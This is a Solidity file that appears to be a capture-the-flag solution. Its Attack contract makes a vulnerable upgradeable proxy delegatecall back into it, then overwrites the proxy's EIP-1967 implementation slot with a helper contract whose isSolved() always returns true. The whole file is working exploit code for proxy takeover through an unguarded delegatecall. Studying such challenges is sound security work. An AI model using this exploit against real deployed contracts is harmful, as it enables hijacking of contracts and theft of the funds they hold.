// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract AttackHelper is Initializable {
    address public owner;
    address public player;

    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not_owner");
        _;
    }

    function execute(address logic) external payable {
        (bool success, ) = logic.delegatecall(
            abi.encodeWithSignature("exec()")
        );
        require(success, "call_fail");
    }

    function isSolved() external pure returns (bool) {
        return true;
    }
}

contract Attack {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address payable proxy;

    struct AddressSlot {
        address value;
    }

    constructor(address proxy_) {
        proxy = payable(proxy_);
    }

    function attack() public returns (bool) {
        (bool success, ) = proxy.call(
            abi.encodeWithSignature("execute(address)", address(this))
        );
        return success;
    }

    function exec() public returns (bool) {
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = 0xa9c71037Aa3d8d6dFfF5478131830a73BD9855Cf; // replace with AttackHelper address
        return true;
    }

    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    function isSolved() external pure returns (bool) {
        return true;
    }
}
